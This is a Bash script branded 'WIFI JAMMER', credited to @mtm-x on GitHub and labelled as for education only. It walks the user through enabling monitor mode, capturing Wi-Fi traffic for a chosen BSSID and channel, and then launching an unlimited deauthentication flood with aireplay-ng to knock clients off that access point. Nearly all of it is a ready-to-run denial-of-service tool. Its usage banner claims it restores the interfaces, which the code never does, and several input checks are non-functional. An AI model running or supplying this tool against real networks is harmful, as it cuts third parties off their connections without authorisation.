#!/bin/bash
RED="\e[31m"
CYAN="\e[36m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"
YELLOW="33"
ITALICYELLOW="\e[3;${YELLOW}m"
echo -e "${RED}"
echo "__          _______ ______ _____        _         __  __ __  __ ______ _____  "
echo "\ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \ "
echo " \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) |"
echo "  \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  /"
echo "   \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \ "
echo "    \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\ "

echo -e "${ENDCOLOR}"
echo -e "${GREEN}"
echo "--------------------------------------------------------------------------------"
echo "------------------------  Wrtten by @mtm-x (GitHub) ----------------------------"
echo "------------------------  Education purpose only -------------------------------"
echo "--------------------------------Versio-1.0--------------------------------------"
echo -e "${ENDCOLOR}"

echo -e "${ITALICYELLOW}"

echo "--------------------------------------------------------------------------------"
echo "------------------------------------USAGE---------------------------------------"
echo "---                        Starts moniter interface                          ---"
echo "---                        Runs airodump-ng                                  ---"
echo "---                        Dumps specified network traffic                   ---"
echo "---                        Deauthenticates specified AP                      ---"
echo "---                        Restores wireless interfaces                      ---"
echo "--------------------------------------------------------------------------------"
echo "------------------------------------NOTE----------------------------------------"
echo "---                             Use small y/n                                ---"
echo "--------------------------------------------------------------------------------"
echo "=============================Press enter to continue============================"
echo -e "${ENDCOLOR}"
echo ""
read START
if [[ $START == "" ]]; then
clear
fi

#Use at your own risk...
echo -e "${RED}"
echo "---------------------------------------------------"
echo "-Would you like to start a moniter interface[y/n]?-"
echo "---------------------------------------------------"
echo -e "${ENDCOLOR}"
echo ""
read MONIF
clear

if [[ $MONIF == 'y' ]]; then
echo ""
iwconfig
echo -e "${RED}"
echo "Please type the  wireless interface from above"
echo -e "${ENDCOLOR}"
echo ""
read WIRELESS
[[ $WIRELESS == "" ]]
sleep 1
clear
echo -e "${RED}"
echo "Starting interface on $WIRELESS..."
echo -e "${ENDCOLOR}"
sleep 1
airmon-ng start $WIRELESS
sleep 4
clear
else
echo ""
echo -e "${RED}"
echo "Skipping..."
echo -e "${ENDCOLOR}"
sleep 2
clear
fi



if [[ $WIRELESS == 'wlan0' ]];
then
echo ""
wire=wlan0mon
else
wire=mon0
fi
echo -e "${RED}"
echo "Your new WiFI interface is $wire"
echo -e "${ENDCOLOR}"
clear

echo -e "${RED}"
echo "--------------------------------------------------"
echo "-Would you like to dump the network traffic[y/n]?-"
echo "--------------------------------------------------"
echo -e "${ENDCOLOR}"
echo ""
read DUMP
clear
if [[ $DUMP == 'y' ]]; then
echo ""
echo -e "${RED}"
echo "Dumping network traffic...[Ctrl+C to stop]"
echo -e "${ENDCOLOR}"
sleep 2
airodump-ng $wire
else
echo ""
echo -e "${RED}"
echo "Skipping..."
echo -e "${ENDCOLOR}"
sleep 2
clear
fi
echo -e "${RED}"
echo "---------------------------------------------------------------------------"
echo "- Dump specified network traffic you want to jam . Press entry to continue"
echo "---------------------------------------------------------------------------"
echo -e "${ENDCOLOR}"
echo ""
read sdump
if [[ $sdump == "" ]]; then
echo ""
echo -e "${RED}"
echo "Please enter the network BSSID:"
echo -e "${ENDCOLOR}"
echo ""
read BSSID
[[ $BSSID == "" ]]
echo ""
echo -e "${RED}"
echo "Please enter the network channel:"
echo -e "${ENDCOLOR}"
echo ""
read CHANNEL
[[ $CHANNEL == "" ]]
echo ""
echo -e "${RED}"
echo "Dumping specific network traffic...[Ctrl+C to stop]"
echo -e "${ENDCOLOR}"
sleep 2
airodump-ng  -c $CHANNEL --bssid $BSSID $wire
clear
else
echo ""
echo -e "${RED}"
echo "Skipping..."
echo -e "${ENDCOLOR}"
sleep 2
clear
fi
clear
echo -e "${RED}"
echo "-----------------------------------------------------------------------------------------------------------"
echo "-Would you like to start Deauthentication attack(Jamming the AP) on the specified network traffic[y/n]?-"
echo "-----------------------------------------------------------------------------------------------------------"
echo -e "${ENDCOLOR}"
echo ""
read deauth
clear
if [[ $deauth == 'y' ]]; then
clear
echo -e "${RED}"
echo "Sending Deauthentication packets to to specified network...[Ctrl+C to stop] "
echo -e "${ENDCOLOR}"
sleep 1
aireplay-ng --deauth 0 -a $BSSID $wire
sleep 2
clear
else
echo ""
echo "Skipping..."
sleep 2
clear
fi

